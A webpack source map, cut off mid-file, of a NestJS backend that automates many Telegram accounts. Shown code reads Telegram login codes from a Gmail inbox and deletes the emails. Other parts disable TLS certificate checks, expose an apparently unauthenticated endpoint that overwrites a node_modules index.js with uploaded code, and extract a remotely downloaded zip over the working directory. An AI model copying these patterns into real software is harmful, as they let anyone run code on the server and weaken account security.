BD,EAAOxkC,QAAUykC,QAAQ,Q,WCAzBD,EAAOxkC,QAAUykC,QAAQ,c,WCAzBD,EAAOxkC,QAAUykC,QAAQ,oB,WCAzBD,EAAOxkC,QAAUykC,QAAQ,kB,WCAzBD,EAAOxkC,QAAUykC,QAAQ,a,WCAzBD,EAAOxkC,QAAUykC,QAAQ,O,WCAzBD,EAAOxkC,QAAUykC,QAAQ,W,WCAzBD,EAAOxkC,QAAUykC,QAAQ,S,WCAzBD,EAAOxkC,QAAUykC,QAAQ,W,WCAzBD,EAAOxkC,QAAUykC,QAAQ,mB,WCAzBD,EAAOxkC,QAAUykC,QAAQ,oB,WCAzBD,EAAOxkC,QAAUykC,QAAQ,0B,WCAzBD,EAAOxkC,QAAUykC,QAAQ,kB,WCAzBD,EAAOxkC,QAAUykC,QAAQ,6B,UCAzBD,EAAOxkC,QAAUykC,QAAQ,oB,WCAzBD,EAAOxkC,QAAUykC,QAAQ,c,WCAzBD,EAAOxkC,QAAUykC,QAAQ,K,WCAzBD,EAAOxkC,QAAUykC,QAAQ,O,GCCrBC,EAA2B,CAAC,ECE5BC,EDCJ,SAASC,EAAoBC,GAE5B,IAAIC,EAAeJ,EAAyBG,GAC5C,QAAqB/wB,IAAjBgxB,EACH,OAAOA,EAAa9kC,QAGrB,IAAIwkC,EAASE,EAAyBG,GAAY,CAGjD7kC,QAAS,CAAC,GAOX,OAHA+kC,EAAoBF,GAAUG,KAAKR,EAAOxkC,QAASwkC,EAAQA,EAAOxkC,QAAS4kC,GAGpEJ,EAAOxkC,OACf,CCnB0B4kC,CAAoB,M","sources":[".././src/IMap/IMap.ts",".././src/app.controller.ts",".././src/app.module.ts",".././src/app.service.ts",".././src/cloudinary.ts",".././src/components/ConfigurationInit/configuration.schema.ts",".././src/components/ConfigurationInit/init.controller.ts",".././src/components/ConfigurationInit/init.module.ts",".././src/components/ConfigurationInit/init.service.ts",".././src/components/Telegram/Telegram.controller.ts",".././src/components/Telegram/Telegram.module.ts",".././src/components/Telegram/Telegram.service.ts",".././src/components/Telegram/TelegramManager.ts",".././src/components/Telegram/dto/addContact.dto.ts",".././src/components/Telegram/dto/addContacts.dto.ts",".././src/components/TgSignup/TgSignup.module.ts",".././src/components/TgSignup/TgSignup.service.ts",".././src/components/TgSignup/dto/tg-signup.dto.ts",".././src/components/TgSignup/tgSignup.controller.ts",".././src/components/active-channels/active-channels.controller.ts",".././src/components/active-channels/active-channels.module.ts",".././src/components/active-channels/active-channels.service.ts",".././src/components/active-channels/dto/add-reaction.dto.ts",".././src/components/active-channels/dto/create-active-channel.dto.ts",".././src/components/active-channels/dto/update-active-channel.dto.ts",".././src/components/active-channels/schemas/active-channel.schema.ts",".././src/components/archived-clients/archived-client.controller.ts",".././src/components/archived-clients/archived-client.module.ts",".././src/components/archived-clients/archived-client.service.ts",".././src/components/buffer-clients/buffer-client.controller.ts",".././src/components/buffer-clients/buffer-client.module.ts",".././src/components/buffer-clients/buffer-client.service.ts",".././src/components/buffer-clients/dto/create-buffer-client.dto.ts",".././src/components/buffer-clients/dto/search-buffer- client.dto.ts",".././src/components/buffer-clients/dto/update-buffer-client.dto.ts",".././src/components/buffer-clients/schemas/buffer-client.schema.ts",".././src/components/builds/build.controller.ts",".././src/components/builds/build.module.ts",".././src/components/builds/build.service.ts",".././src/components/builds/builds.schema.ts",".././src/components/channels/channels.controller.ts",".././src/components/channels/channels.module.ts",".././src/components/channels/channels.service.ts",".././src/components/channels/dto/create-channel.dto.ts",".././src/components/channels/dto/search-channel.dto.ts",".././src/components/channels/dto/update-channel.dto.ts",".././src/components/channels/schemas/channel.schema.ts",".././src/components/clients/client.controller.ts",".././src/components/clients/client.module.ts",".././src/components/clients/client.service.ts",".././src/components/clients/dto/create-client.dto.ts",".././src/components/clients/dto/search-client.dto.ts",".././src/components/clients/dto/update-client.dto.ts",".././src/components/clients/schemas/client.schema.ts",".././src/components/n-point/npoint.controller.ts",".././src/components/n-point/npoint.module.ts",".././src/components/n-point/npoint.service.ts",".././src/components/promote-clients/dto/create-promote-client.dto.ts",".././src/components/promote-clients/dto/search-promote-client.dto.ts",".././src/components/promote-clients/dto/update-promote-client.dto.ts",".././src/components/promote-clients/promote-client.controller.ts",".././src/components/promote-clients/promote-client.module.ts",".././src/components/promote-clients/promote-client.service.ts",".././src/components/promote-clients/schemas/promote-client.schema.ts",".././src/components/promote-msgs/promote-msgs.controller.ts",".././src/components/promote-msgs/promote-msgs.module.ts",".././src/components/promote-msgs/promote-msgs.schema.ts",".././src/components/promote-msgs/promote-msgs.service.ts",".././src/components/promote-stats/dto/create-promote-stat.dto.ts",".././src/components/promote-stats/dto/update-promote-stat.dto.ts",".././src/components/promote-stats/promote-stat.controller.ts",".././src/components/promote-stats/promote-stat.module.ts",".././src/components/promote-stats/promote-stat.service.ts",".././src/components/promote-stats/schemas/promote-stat.schema.ts",".././src/components/stats2/create-stat2.dto.ts",".././src/components/stats2/stat2.controller.ts",".././src/components/stats2/stat2.module.ts",".././src/components/stats2/stat2.schema.ts",".././src/components/stats2/stat2.service.ts",".././src/components/stats2/update-stat2.dto.ts",".././src/components/stats/create-stat.dto.ts",".././src/components/stats/stat.controller.ts",".././src/components/stats/stat.module.ts",".././src/components/stats/stat.schema.ts",".././src/components/stats/stat.service.ts",".././src/components/stats/update-stat.dto.ts",".././src/components/transactions/dto/create-transaction.dto.ts",".././src/components/transactions/dto/update-transaction.dto.ts",".././src/components/transactions/schemas/transaction.schema.ts",".././src/components/transactions/transaction.controller.ts",".././src/components/transactions/transaction.module.ts",".././src/components/transactions/transaction.service.ts",".././src/components/upi-ids/upi-ids.controller.ts",".././src/components/upi-ids/upi-ids.module.ts",".././src/components/upi-ids/upi-ids.schema.ts",".././src/components/upi-ids/upi-ids.service.ts",".././src/components/user-data/dto/create-user-data.dto.ts",".././src/components/user-data/dto/search-user-data.dto.ts",".././src/components/user-data/dto/update-user-data.dto.ts",".././src/components/user-data/schemas/user-data.schema.ts",".././src/components/user-data/user-data.controller.ts",".././src/components/user-data/user-data.module.ts",".././src/components/user-data/user-data.service.ts",".././src/components/users/dto/create-user.dto.ts",".././src/components/users/dto/search-user.dto.ts",".././src/components/users/dto/update-user.dto.ts",".././src/components/users/schemas/user.schema.ts",".././src/components/users/users.controller.ts",".././src/components/users/users.module.ts",".././src/components/users/users.service.ts",".././src/main.ts",".././src/middlewares/logger.middleware.ts",".././src/utils.ts","../external commonjs \"@nestjs/common\"","../external commonjs \"@nestjs/config\"","../external commonjs \"@nestjs/core\"","../external commonjs \"@nestjs/mapped-types\"","../external commonjs \"@nestjs/mongoose\"","../external commonjs \"@nestjs/platform-express\"","../external commonjs \"@nestjs/swagger\"","../external commonjs \"adm-zip\"","../external commonjs \"axios\"","../external commonjs \"big-integer\"","../external commonjs \"class-transformer\"","../external commonjs \"class-validator\"","../external commonjs \"cloudinary\"","../external commonjs \"imap\"","../external commonjs \"mongoose\"","../external commonjs \"multer\"","../external commonjs \"telegram\"","../external commonjs \"telegram/Helpers\"","../external commonjs \"telegram/Password\"","../external commonjs \"telegram/client/uploads\"","../external commonjs \"telegram/events\"","../external commonjs \"telegram/extensions/Logger\"","../external commonjs \"telegram/sessions\"","../external commonjs \"telegram/tl\"","../external node-commonjs \"fs\"","../external node-commonjs \"path\"","../webpack/bootstrap","../webpack/startup"],"sourcesContent":["import Imap from 'imap';\r\nimport { fetchNumbersFromString, parseError, sleep } from '../utils';\r\n\r\nexport class MailReader {\r\n    private static instance: MailReader;\r\n    private imap: Imap;\r\n    private isReady: boolean = false;\r\n    private result: string = '';\r\n\r\n    private constructor() {\r\n        this.imap = new Imap({\r\n            user: process.env.GMAIL_ADD,\r\n            password: process.env.GMAIL_PASS,\r\n            host: 'imap.gmail.com',\r\n            port: 993,\r\n            tls: true,\r\n            tlsOptions: {\r\n                rejectUnauthorized: false,\r\n            },\r\n        });\r\n\r\n        this.imap.on('ready', () => {\r\n            console.log('Mail is Ready');\r\n            this.isReady = true;\r\n        });\r\n\r\n        this.imap.on('error', (err) => {\r\n            console.error('SomeError:', err);\r\n            this.isReady = false;\r\n        });\r\n\r\n        this.imap.on('end', () => {\r\n            console.log('Connection ended');\r\n            this.isReady = false;\r\n        });\r\n    }\r\n\r\n    public static getInstance(): MailReader {\r\n        if (!MailReader.instance) {\r\n            MailReader.instance = new MailReader();\r\n        }\r\n        return MailReader.instance;\r\n    }\r\n\r\n    public async connectToMail(): Promise<void> {\r\n        console.log('Connecting to mail server');\r\n        try {\r\n            this.imap.connect();\r\n            this.isReady = true;\r\n            console.log('Connected to mail server');\r\n        } catch (err) {\r\n            console.error('Error connecting to mail server:', parseError(err));\r\n            throw err;\r\n        }\r\n    }\r\n\r\n    public async disconnectFromMail(): Promise<void> {\r\n        console.log('Disconnecting from mail server');\r\n        try {\r\n            this.imap.end();\r\n            this.isReady = false;\r\n            console.log('Disconnected from mail server');\r\n        } catch (err) {\r\n            console.error('Error disconnecting from mail server:', parseError(err));\r\n            throw err;\r\n        }\r\n    }\r\n\r\n    public async isMailReady(): Promise<boolean> {\r\n        return this.isReady;\r\n    }\r\n\r\n    public async getCode(): Promise<string> {\r\n        console.log(\"MailReady : \", this.isReady)\r\n        if (!this.isReady) {\r\n            console.log(\"Re-Connecting mail server\");\r\n            await this.connectToMail();\r\n            await sleep(10000);\r\n        }\r\n\r\n        try {\r\n            await this.openInbox();\r\n\r\n            const searchCriteria = [['FROM', 'noreply@telegram.org']];\r\n            const fetchOptions = { bodies: ['HEADER', 'TEXT'], markSeen: true };\r\n            console.log('Inbox Opened');\r\n\r\n            const results = await new Promise<any[]>((resolve, reject) => {\r\n                this.imap.search(searchCriteria, (err, results) => {\r\n                    if (err) {\r\n                        console.error('Search error:', parseError(err));\r\n                        reject(err);\r\n                    } else {\r\n                        resolve(results);\r\n                    }\r\n                });\r\n            });\r\n\r\n            if (results.length > 0) {\r\n                console.log('Emails found:', results.length);\r\n                const length = results.length;\r\n                const fetch = this.imap.fetch([results[length - 1]], fetchOptions);\r\n\r\n                await new Promise<void>((resolve, reject) => {\r\n                    fetch.on('message', (msg, seqno) => {\r\n                        const emailData: string[] = [];\r\n\r\n                        msg.on('body', (stream, info) => {\r\n                            let buffer = '';\r\n                            stream.on('data', (chunk) => buffer += chunk.toString('utf8'));\r\n                            stream.on('end', () => {\r\n                                if (info.which === 'TEXT') {\r\n                                    emailData.push(buffer);\r\n                                }\r\n                                this.imap.seq.addFlags([seqno], '\\\\Deleted', (err) => {\r\n                                    if (err) reject(err);\r\n                                    this.imap.expunge((err) => {\r\n                                        if (err) reject(err);\r\n                                        console.log('Deleted message');\r\n                                    });\r\n                                });\r\n                            });\r\n                        });\r\n\r\n                        msg.once('end', () => {\r\n                            console.log(`Email #${seqno}, Latest ${results[length - 1]}`);\r\n                            console.log('EmailDataLength:', emailData.length);\r\n                            console.log('Mail:', emailData[emailData.length - 1].split('.'));\r\n                            this.result = fetchNumbersFromString(emailData[emailData.length - 1].split('.')[0]);\r\n                            resolve();\r\n                        });\r\n                    });\r\n\r\n                    fetch.once('end', () => {\r\n                        console.log('Fetched mails');\r\n                        resolve();\r\n                    });\r\n                });\r\n            } else {\r\n                console.log('No new emails found');\r\n            }\r\n\r\n            console.log('Returning result:', this.result);\r\n            return this.result;\r\n        } catch (error) {\r\n            console.error('Error:', error);\r\n            this.isReady = false;\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    private async openInbox(): Promise<void> {\r\n        await new Promise<void>((resolve, reject) => {\r\n            this.imap.openBox('INBOX', false, (err) => {\r\n                if (err) {\r\n                    console.error('Open Inbox error:', parseError(err));\r\n                    reject(err);\r\n                } else {\r\n                    console.log('Inbox opened');\r\n                    resolve();\r\n                }\r\n            });\r\n        });\r\n    }\r\n}","import { Controller, Get, Post, UploadedFile, UseInterceptors } from '@nestjs/common';\r\nimport { AppService } from './app.service';\r\nimport { FileInterceptor } from '@nestjs/platform-express';\r\nimport { ApiOperation, ApiConsumes, ApiBody } from '@nestjs/swagger';\r\nimport { existsSync, mkdirSync, promises as fs } from 'fs';\r\nimport { diskStorage, File as MulterFile } from 'multer';\r\nimport { join } from 'path';\r\nimport { CloudinaryService } from './cloudinary';\r\n\r\n@Controller()\r\nexport class AppController {\r\n    constructor(private readonly appService: AppService) {}\r\n\r\n    @Get()\r\n    getHello(): string {\r\n        return this.appService.getHello();\r\n    }\r\n\r\n    @Post('updateCommonService')\r\n    @UseInterceptors(\r\n        FileInterceptor('file', {\r\n            storage: diskStorage({\r\n                destination: (req, file, cb) => {\r\n                    try {\r\n                        const folderPath = join(__dirname, '..', 'uploads');\r\n                        if (!existsSync(folderPath)) {\r\n                            mkdirSync(folderPath, { recursive: true });\r\n                        }\r\n                        cb(null, folderPath);\r\n                    } catch (error) {\r\n                        cb(error, null);\r\n                    }\r\n                },\r\n                filename: (req, file, cb) => {\r\n                    cb(null, 'index.js');\r\n                },\r\n            }),\r\n        }),\r\n    )\r\n    @ApiOperation({ summary: 'Upload a file to update commonService index.js' })\r\n    @ApiConsumes('multipart/form-data')\r\n    @ApiBody({\r\n        schema: {\r\n            type: 'object',\r\n            properties: {\r\n                file: { type: 'string', format: 'binary' },\r\n            },\r\n        },\r\n    })\r\n    async uploadFileAndUpdate(@UploadedFile() file: MulterFile): Promise<{ message: string }> {\r\n        try {\r\n            const targetDir = join(__dirname, '..', 'node_modules', 'commonService', 'dist');\r\n            const filePath = join(targetDir, 'index.js');\r\n\r\n            // Ensure the target directory exists\r\n            if (!existsSync(targetDir)) {\r\n                mkdirSync(targetDir, { recursive: true });\r\n            }\r\n\r\n            // Read the uploaded file\r\n            const fileBuffer = await fs.readFile(file.path);\r\n\r\n            // Write to the target location\r\n            await fs.writeFile(filePath, fileBuffer);\r\n\r\n            console.log('commonService/index.js updated successfully.');\r\n            return { message: 'commonService/index.js updated successfully' };\r\n        } catch (error) {\r\n            console.error('Failed to update commonService/index.js:', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n}\r\n","import { MiddlewareConsumer, Module, NestModule } from '@nestjs/common';\nimport { UsersModule } from './components/users/users.module';\nimport { UserDataModule } from './components/user-data/user-data.module';\nimport { ClientModule } from './components/clients/client.module';\nimport { TelegramModule } from './components/Telegram/Telegram.module';\nimport { BufferClientModule } from './components/buffer-clients/buffer-client.module';\nimport { ActiveChannelsModule } from './components/active-channels/active-channels.module';\nimport { ArchivedClientModule } from './components/archived-clients/archived-client.module';\nimport { initModule } from './components/ConfigurationInit/init.module';\nimport { ChannelsModule } from './components/channels/channels.module';\nimport { AppController } from './app.controller';\nimport { AppService } from './app.service';\nimport { LoggerMiddleware } from './middlewares/logger.middleware';\nimport { BuildModule } from './components/builds/build.module';\nimport { UpiIdModule } from './components/upi-ids/upi-ids.module';\nimport { PromoteMsgModule } from './components/promote-msgs/promote-msgs.module';\nimport { StatModule } from './components/stats/stat.module';\nimport { Stat2Module } from './components/stats2/stat2.module';\nimport { PromoteStatModule } from './components/promote-stats/promote-stat.module';\nimport { PromoteClientModule } from './components/promote-clients/promote-client.module';\nimport { TgSignupModule } from './components/TgSignup/TgSignup.module';\nimport { TransactionModule } from './components/transactions/transaction.module';\nimport { NpointModule } from './components/n-point/npoint.module';\n\n@Module({\n  imports: [\n    initModule,\n    TelegramModule,\n    ActiveChannelsModule,\n    ClientModule,\n    UserDataModule,\n    UsersModule,\n    BufferClientModule,\n    ArchivedClientModule,\n    ChannelsModule,\n    PromoteClientModule,\n    BuildModule,\n    UpiIdModule,\n    PromoteMsgModule,\n    PromoteStatModule,\n    StatModule,\n    Stat2Module,\n    TgSignupModule,\n    TransactionModule,\n    NpointModule,\n  ],\n  controllers:[AppController],\n  providers:[AppService],\n  exports:[\n    TelegramModule,\n    ActiveChannelsModule,\n    ClientModule,\n    UserDataModule,\n    UsersModule,\n    BufferClientModule,\n    ArchivedClientModule,\n    ChannelsModule,\n    PromoteClientModule,\n    TgSignupModule,\n    TransactionModule\n  ]\n})\nexport class AppModule implements NestModule {\n  configure(consumer: MiddlewareConsumer) {\n    consumer.apply(LoggerMiddleware).forRoutes('*');\n  }\n}","import { Injectable } from '@nestjs/common';\r\nimport { promises as fs } from 'fs';\r\nimport { join } from 'path';\r\nimport { diskStorage, File as MulterFile } from 'multer';\r\n\r\n@Injectable()\r\nexport class AppService {\r\n  getHello(): string {\r\n    return 'Hello World!';\r\n  }\r\n}\r\n","console.log(\"in Cloudinary\");\nimport * as cloudinary from 'cloudinary';\nimport * as path from 'path';\nimport * as fs from 'fs';\nimport { fetchWithTimeout, parseError } from './utils';\nimport AdmZip from 'adm-zip';\n\nexport class CloudinaryService {\n    static instance;\n    resources = new Map();\n\n    constructor() {\n        cloudinary.v2.config({\n            cloud_name: process.env.CL_NAME,\n            api_key: process.env.CL_APIKEY,\n            api_secret: process.env.CL_APISECRET\n        });\n    }\n\n    static async getInstance(name) {\n        if (!CloudinaryService.instance) {\n            CloudinaryService.instance = new CloudinaryService();\n        }\n        await CloudinaryService.instance.getResourcesFromFolder(name);\n        return CloudinaryService.instance;\n    }\n\n    public async downloadAndExtractZip(url: string) {\n        const rootPath = process.cwd();\n        const zipPath = path.resolve(rootPath, 'temp.zip');\n        const extractPath = path.resolve(rootPath);\n    \n        console.log(`Starting download of zip file from ${url}`);\n        // Download the zip file\n        const response = await fetchWithTimeout(url, { responseType: 'arraybuffer' });\n        if (response?.status === 200) {\n            console.log('Zip file downloaded successfully.');\n            fs.writeFileSync(zipPath, response.data);\n            console.log(`Zip file saved to ${zipPath}`);\n            \n            // Extract the zip file using adm-zip\n            const zip = new AdmZip(zipPath);\n            console.log(`Extracting zip file to ${extractPath}`);\n            zip.extractAllTo(extractPath, true);\n            console.log('Zip file extracted successfully.');\n            \n            fs.unlinkSync(zipPath); // Remove the zip file after extraction\n            console.log(`Temporary zip file ${zipPath} deleted.`);\n        } else {\n            const errorMessage = `Unable to download zip file from ${url}`;\n            console.error(errorMessage);\n            throw new Error(errorMessage);\n        }\n    }\n\n    async getResourcesFromFolder(folderName) {\n        console.log('FETCHING NEW FILES!! from CLOUDINARY');\n        await this.downloadAndExtractZip(`https://promoteClients2.glitch.me/folders/${folderName}/files/download-all`);\n        // await this.findAndSaveResources(folderName, 'image');\n    }\n\n    async createNewFolder(folderName) {\n        await this.createFolder(folderName);\n        await this.uploadFilesToFolder(folderName);\n    }\n\n    async overwriteFile() {\n        const cloudinaryFileId = \"index_nbzca5.js\";\n        const localFilePath = \"./src/test.js\";\n\n        try {\n\n            const result = await cloudinary.v2.uploader.upload(localFilePath, {\n                resource_type: 'auto',\n                overwrite: true,\n                invalidate: true,\n                public_id: cloudinaryFileId\n            });\n            console.log(result);\n        } catch (error) {\n            parseError(error)\n        }\n\n    }\n\n    async findAndSaveResources(folderName: string, type: string): Promise<void> {\n        try {\n            const { resources } = await cloudinary.v2.api.resources({ resource_type: type, type: 'upload', prefix: folderName, max_results: 500 });\n            await Promise.all(resources.map(async (resource) => {\n                try {\n                    this.resources.set(resource.public_id.split('/')[1].split('_')[0], resource.url);\n                    await saveFile(resource.url, resource.public_id.split('/')[1].split('_')[0]);\n                } catch (error) {\n                    console.log(resource);\n                    parseError(error)\n                }\n            }));\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    async createFolder(folderName) {\n        try {\n            const result = await cloudinary.v2.api.create_folder(folderName);\n\n            return result;\n        } catch (error) {\n            console.error('Error creating folder:', error);\n            throw error;\n        }\n    }\n\n    // Function to upload files from URLs to a specific folder in Cloudinary\n    async uploadFilesToFolder(folderName) {\n        const uploadPromises = Array.from(this.resources.entries()).map(async ([key, url]) => {\n            try {\n                const result = await cloudinary.v2.uploader.upload_large(url, {\n                    folder: folderName,\n                    resource_type: 'auto',\n                    public_id: key, // Set the key as the public_id\n                });\n\n                return result;\n            } catch (error) {\n                console.error('Error uploading file:', error);\n                throw error;\n            }\n        });\n\n        try {\n            return await Promise.all(uploadPromises);\n        } catch (error) {\n            console.error('Error uploading files:', error);\n            throw error;\n        }\n    }\n\n    async printResources() {\n        try {\n            this.resources?.forEach((val, key) => {\n                console.log(key, \":\", val);\n            })\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    get(publicId) {\n        try {\n            const result = this.resources.get(publicId)\n            return result || '';\n        } catch (error) {\n            parseError(error)\n        }\n    }\n\n    getBuffer(publicId) {\n        try {\n            const result = this.resources.get(publicId)\n            return result || '';\n        } catch (error) {\n            console.log(error);\n        }\n    }\n}\n\nasync function saveFile(url: string, name: string) {\n    try {\n        const extension = url.substring(url.lastIndexOf('.') + 1);\n        const rootPath = process.cwd();\n        const mypath = path.join(rootPath, `${name}.${extension}`);\n        console.log(mypath);\n\n        const res = await fetchWithTimeout(url, { responseType: 'arraybuffer' }, 2);\n\n        if (res?.statusText === 'OK') {\n            if (!fs.existsSync(mypath)) {\n                fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\n                console.log(`${name}.${extension} Saved!!`);\n            } else {\n                fs.unlinkSync(mypath);\n                fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\n                console.log(`${name}.${extension} Replaced!!`);\n            }\n        } else {\n            throw new Error(`Unable to download file from ${url}`);\n        }\n    } catch (err) {\n        parseError(err);\n    }\n}","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type ConfigurationDocument = Configuration & Document;\n\n@Schema({\n    versionKey: false, autoIndex: true, strict: false, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class Configuration { }\n\nexport const ConfigurationSchema = SchemaFactory.createForClass(Configuration);\nConfigurationSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\r\nimport { ConfigurationService } from './init.service';\r\n\r\n@ApiTags('Configuration')\r\n@Controller('configuration')\r\nexport class ConfigurationController {\r\n  constructor(private readonly configurationService: ConfigurationService) {}\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get configuration data' })\r\n  async findOne(): Promise<any>{\r\n    return this.configurationService.findOne();\r\n  }\r\n\r\n  @Patch()\r\n  @ApiOperation({ summary: 'Update configuration' })\r\n  @ApiBody({type: Object})\r\n  async update( @Body() updateClientDto: any): Promise<any> {\r\n    return this.configurationService.update( updateClientDto);\r\n  }\r\n\r\n}\r\n","import { Module, Global, OnModuleDestroy, Inject, OnModuleInit } from '@nestjs/common';\r\nimport { ConfigModule } from '@nestjs/config';\r\nimport { MongooseModule, getConnectionToken } from '@nestjs/mongoose';\r\nimport { ConfigurationService } from './init.service';\r\nimport { ConfigurationSchema } from './configuration.schema';\r\nimport { ConfigurationController } from './init.controller';\r\nimport { Connection } from 'mongoose';\r\nimport { fetchWithTimeout, ppplbot } from '../../utils';\r\n\r\n@Global()\r\n@Module({\r\n  imports: [\r\n    ConfigModule.forRoot(), // Ensure ConfigModule is imported\r\n    MongooseModule.forRootAsync({\r\n      useFactory: () => ({\r\n        uri: process.env.mongouri,\r\n      }),\r\n    }),\r\n    MongooseModule.forFeature([{\r\n      name: 'configurationModule', collection: 'configuration', schema: ConfigurationSchema\r\n    }])\r\n  ],\r\n  providers: [ConfigurationService],\r\n  controllers: [ConfigurationController],\r\n  exports: [ConfigModule, MongooseModule],\r\n})\r\nexport class initModule implements OnModuleDestroy, OnModuleInit {\r\n  constructor(@Inject(getConnectionToken()) private readonly connection: Connection) {}\r\n  async onModuleInit() {\r\n    console.log(`Started :: ${process.env.clientId}`)\r\n    await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Started :: ${process.env.clientId}`)}`);\r\n  }\r\n\r\n  async onModuleDestroy() {\r\n    console.log(\"Init Module Destroying\")\r\n    await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`closed :: ${process.env.clientId}`)}`);\r\n    this.closeConnection();\r\n  }\r\n\r\n  private closeConnection() {\r\n    console.log(\"Closing mongoose connection\")\r\n    this.connection.close(true)\r\n  }\r\n}","import { Injectable, NotFoundException, OnModuleInit } from '@nestjs/common';\r\nimport { InjectModel } from '@nestjs/mongoose';\r\nimport { Model } from 'mongoose';\r\nimport { Configuration } from './configuration.schema';\r\nimport { CloudinaryService } from '../../cloudinary';\r\n\r\n@Injectable()\r\nexport class ConfigurationService {\r\n    constructor(@InjectModel('configurationModule') private configurationModel: Model<Configuration>) {\r\n        this.setEnv()\r\n     }\r\n\r\n    async OnModuleInit() {\r\n       console.log(\"Config Module Inited\")\r\n    }\r\n\r\n    async findOne(): Promise<any> {\r\n        const user = await this.configurationModel.findOne({}).exec();\r\n        if (!user) {\r\n            throw new NotFoundException(`configurationModel not found`);\r\n        }\r\n        return user;\r\n    }\r\n\r\n    async setEnv() {\r\n        console.log(\"Setting Envs\");\r\n        const configuration: Configuration = await this.configurationModel.findOne({}, { _id: 0 });\r\n        const data = {...configuration}\r\n        for (const key in data) {\r\n            console.log('setting', key)\r\n            process.env[key] = data[key];\r\n        }\r\n        console.log(\"finished setting env\");\r\n    }\r\n\r\n    async update(updateClientDto: any): Promise<any> {\r\n        delete updateClientDto['_id']\r\n        const updatedUser = await this.configurationModel.findOneAndUpdate(\r\n            {}, // Assuming you want to update the first document found in the collection\r\n            { $set: { ...updateClientDto } },\r\n            { new: true, upsert: true }\r\n        ).exec();\r\n        if (!updatedUser) {\r\n            throw new NotFoundException(`configurationModel not found`);\r\n        }\r\n        return updatedUser;\r\n    }\r\n\r\n}\r\n","import { Controller, Get, Post, Body, Param, Query, BadRequestException, Res } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiQuery, ApiParam, ApiBody, ApiResponse } from '@nestjs/swagger';\r\nimport { TelegramService } from './Telegram.service';\r\nimport * as fs from 'fs';\r\nimport { AddContactsDto } from './dto/addContacts.dto';\r\nimport { AddContactDto } from './dto/addContact.dto';\r\n\r\n@Controller('telegram')\r\n@ApiTags('Telegram')\r\nexport class TelegramController {\r\n    constructor(\r\n        private readonly telegramService: TelegramService\r\n    ) {}\r\n\r\n    async connectToTelegram(mobile: string) {\r\n        return await this.telegramService.createClient(mobile);\r\n    }\r\n\r\n    @Get('connect/:mobile')\r\n    @ApiOperation({ summary: 'Create and connect a new Telegram client' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 201, description: 'Client connected successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async connectClient(@Param('mobile') mobile: string): Promise<string> {\r\n        await this.connectToTelegram(mobile);\r\n        return 'Client connected successfully';\r\n    }\r\n\r\n    @Get('disconnect/:mobile')\r\n    @ApiOperation({ summary: 'Create and connect a new Telegram client' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    //@apiresponse({ status: 201, description: 'Client connected successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async disconnect(@Param('mobile') mobile: string): Promise<boolean> {\r\n        return await this.telegramService.deleteClient(mobile);\r\n    }\r\n\r\n    @Get('disconnectAll')\r\n    @ApiOperation({ summary: 'Create and connect a new Telegram client' })\r\n    //@apiresponse({ status: 201, description: 'Client connected successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async disconnectAll(): Promise<string> {\r\n        await this.telegramService.disconnectAll();\r\n        return 'Clients disconnected successfully';\r\n    }\r\n\r\n    @Get('messages/:mobile')\r\n    @ApiOperation({ summary: 'Get messages from Telegram' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    @ApiQuery({ name: 'username', description: 'Username to fetch messages from', required: true })\r\n    @ApiQuery({ name: 'limit', description: 'Limit the number of messages', required: false })\r\n    //@apiresponse({ status: 200, description: 'Messages fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getMessages(@Param('mobile') mobile: string, @Query('username') username: string, @Query('limit') limit: number = 8) {\r\n        await this.connectToTelegram(mobile);\r\n        return this.telegramService.getMessages(mobile, username, limit);\r\n    }\r\n\r\n    @Get('messagesNew/:mobile')\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    @ApiQuery({ name: 'chatId', description: 'Username to fetch messages from', required: true })\r\n    @ApiQuery({ name: 'limit', description: 'Limit the number of messages', required: false })\r\n    @ApiQuery({ name: 'offset', description: 'offset the number of messages', required: false })\r\n    async getMessagesNew(\r\n        @Param('mobile') mobile: string,\r\n        @Query('chatId') chatId: string,\r\n        @Query('offset') offset: number,\r\n        @Query('limit') limit: number = 20\r\n    ) {\r\n        await this.telegramService.createClient(mobile, false, false);\r\n        const messages = await this.telegramService.getMessagesNew(mobile, chatId, offset, limit);\r\n        return messages;\r\n    }\r\n\r\n    @Get('chatid/:mobile')\r\n    @ApiOperation({ summary: 'Get chat ID for a username' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    @ApiQuery({ name: 'username', description: 'Username to fetch chat ID for', required: true })\r\n    //@apiresponse({ status: 200, description: 'Chat ID fetched successfully' })\r\n    //@apiresponse({ status: 400, description: 'Bad request' })\r\n    async getChatId(@Param('mobile') mobile: string, @Query('username') username: string) {\r\n        await this.connectToTelegram(mobile);\r\n        return await this.telegramService.getChatId(mobile, username);\r\n    }\r\n\r\n    @Get('sendInlineMessage/:mobile')\r\n    @ApiOperation({ summary: 'Get chat ID for a username' })\r\n    @ApiParam({ name: 'mobile', description: 'Mobile number', required: true })\r\n    @ApiQuery({ name: 'chatId', description: 'chat ID of user', required: true })\r\n    @ApiQuery({ name: 'message', description: 'message ID of user', required: true })\r\n    